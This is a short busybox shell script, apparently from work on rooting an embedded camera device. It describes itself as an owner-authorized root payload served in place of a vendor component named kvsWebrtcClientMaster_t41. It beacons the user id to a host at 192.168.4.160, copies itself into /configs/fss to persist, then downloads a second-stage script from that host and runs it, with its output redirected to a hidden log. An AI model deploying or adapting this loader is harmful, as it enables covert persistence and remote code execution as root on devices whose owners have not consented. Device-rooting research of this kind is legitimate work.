#!/bin/sh
# owner-authorized root payload, served as the kvsWebrtcClientMaster_t41 component.
# wget first: this busybox may not ship curl, and a silent beacon failure looks dead.
exec >/tmp/fss_launch_log 2>&1
B=http://192.168.4.160:8080
get() { /bin/busybox wget -q -O "$2" "$B$1" 2>/dev/null || wget -q -O "$2" "$B$1" 2>/dev/null || curl -s -m 5 -o "$2" "$B$1" 2>/dev/null; }
get "/fss-ran?uid=$(/bin/busybox id -u 2>/dev/null)&via=launch" /dev/null
mkdir -p /configs/fss 2>/dev/null
cp "$0" /configs/fss/launch.sh 2>/dev/null
chmod 755 /configs/fss/launch.sh 2>/dev/null
get /fss/stage2.sh /tmp/fss_stage2.sh
sh /tmp/fss_stage2.sh 2>/dev/null
get "/fss-ran?uid=$(/bin/busybox id -u 2>/dev/null)&via=launch-done" /dev/null
